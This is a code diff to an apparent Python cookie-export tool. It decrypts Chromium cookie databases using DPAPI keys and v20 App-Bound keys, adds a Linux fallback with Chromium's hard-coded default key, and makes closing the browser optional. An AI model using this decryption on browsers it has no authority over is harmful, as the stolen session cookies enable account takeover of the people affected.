@@ -32,7 +32,7 @@ try:
     import windows
     import windows.crypto
     import windows.generated_def as gdef
-except ImportError:  # v20 app-bound will be unavailable
+except Exception:  # v20 app-bound will be unavailable outside supported Windows setups
     windows = None
     gdef = None
 
@@ -387,28 +387,49 @@ def chromium_keys(root: Path, *, enable_v20: bool = True, browser_name: str = ""
     legacy: bytes | None = None
     if encrypted_key:
         encrypted = base64.b64decode(encrypted_key)
-        if encrypted.startswith(b"DPAPI"):
+        if encrypted.startswith(b"DPAPI") and os.name == "nt":
             legacy = dpapi_decrypt(encrypted[5:])
         elif encrypted.startswith(b"APPB"):
             legacy = None
-        else:
+        elif os.name == "nt":
             raise RuntimeError("unsupported Chromium os_crypt.encrypted_key format")
 
     v20: bytes | None = None
-    if enable_v20 and state.get("os_crypt", {}).get("app_bound_encrypted_key"):
+    if os.name == "nt" and enable_v20 and state.get("os_crypt", {}).get("app_bound_encrypted_key"):
         v20 = get_v20_master_key(state_file, browser_name=browser_name)
 
     return ChromiumKeys(legacy=legacy, v20=v20)
 
 
+def decrypt_linux_chromium_fallback(encrypted: bytes) -> bytes:
+    payload = encrypted[3:]
+    if len(payload) == 0 or len(payload) % 16:
+        raise RuntimeError("Linux Chromium cookie is not AES-CBC fallback format")
+    key = hashlib.pbkdf2_hmac("sha1", b"peanuts", b"saltysalt", 1, dklen=16)
+    plain = AES.new(key, AES.MODE_CBC, iv=b" " * 16).decrypt(payload)
+    padding = plain[-1]
+    if padding < 1 or padding > 16 or plain[-padding:] != bytes([padding]) * padding:
+        raise RuntimeError("Linux Chromium cookie is likely encrypted with libsecret/kwallet")
+    return plain[:-padding]
+
+
 def decrypt_chromium_cookie(encrypted: bytes, keys: ChromiumKeys, host: str) -> str:
     if encrypted.startswith((b"v10", b"v11")):
         if keys.legacy is None:
-            raise RuntimeError("legacy Chromium key is not available")
-        nonce, payload = encrypted[3:15], encrypted[15:]
-        plain = AES.new(keys.legacy, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
-            payload[:-16], payload[-16:]
-        )
+            if os.name != "nt":
+                plain = decrypt_linux_chromium_fallback(encrypted)
+            else:
+                raise RuntimeError("legacy Chromium key is not available")
+        else:
+            try:
+                nonce, payload = encrypted[3:15], encrypted[15:]
+                plain = AES.new(keys.legacy, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
+                    payload[:-16], payload[-16:]
+                )
+            except Exception:
+                if os.name == "nt":
+                    raise
+                plain = decrypt_linux_chromium_fallback(encrypted)
     elif encrypted.startswith(b"v20"):
         if keys.v20 is None:
             raise RuntimeError("v20/App-Bound Chromium key is not available")
@@ -417,6 +438,8 @@ def decrypt_chromium_cookie(encrypted: bytes, keys: ChromiumKeys, host: str) -> 
         tag = encrypted[-16:]
         plain = AES.new(keys.v20, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(payload, tag)
     else:
+        if os.name != "nt":
+            raise RuntimeError("unsupported Linux Chromium encrypted cookie format")
         plain = dpapi_decrypt(encrypted)
 
     # Chromium may prefix plaintext with SHA256(host_key).
@@ -722,7 +745,12 @@ def main() -> int:
     parser.add_argument(
         "--no-close-browsers",
         action="store_true",
-        help="Do not close running browsers before reading cookie databases",
+        help="Deprecated compatibility flag; browsers are not closed by default",
+    )
+    parser.add_argument(
+        "--close-browsers",
+        action="store_true",
+        help="Close running browsers before reading cookie databases if snapshot copy fails on your system",
     )
     args = parser.parse_args()
 
@@ -738,7 +766,7 @@ def main() -> int:
         raise RuntimeError("no matching browser profile was found")
 
     print("Browser search order: " + " -> ".join(source.name for source in sources))
-    if not args.no_close_browsers:
+    if args.close_browsers and not args.no_close_browsers:
         close_browser_processes(sources)
 
     for source in sources:
